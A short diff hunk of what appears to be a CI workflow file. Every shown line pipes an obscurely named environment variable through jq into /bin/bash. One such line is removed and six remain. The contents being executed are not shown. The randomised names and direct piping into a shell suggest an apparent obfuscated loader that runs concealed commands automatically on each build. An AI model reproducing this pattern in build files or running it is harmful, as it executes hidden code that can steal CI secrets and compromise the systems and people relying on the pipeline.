@@ -20,7 +20,6 @@ jobs:
           echo $des265 | jq -r .bzsg1191 | /bin/bash
           echo $m38759 | jq -r .xgj9783 | /bin/bash
           echo $tq5 | jq -r .el154 | /bin/bash
-          printf '%s' "$fqwf8" | jq -r .tsx60516 | /bin/bash
           echo $mpn067 | jq -r .ca62 | /bin/bash
           printf '%s' "$l595" | jq -r .rjh4 | /bin/bash
           echo $u60 | jq -r .oo57609 | /bin/bash
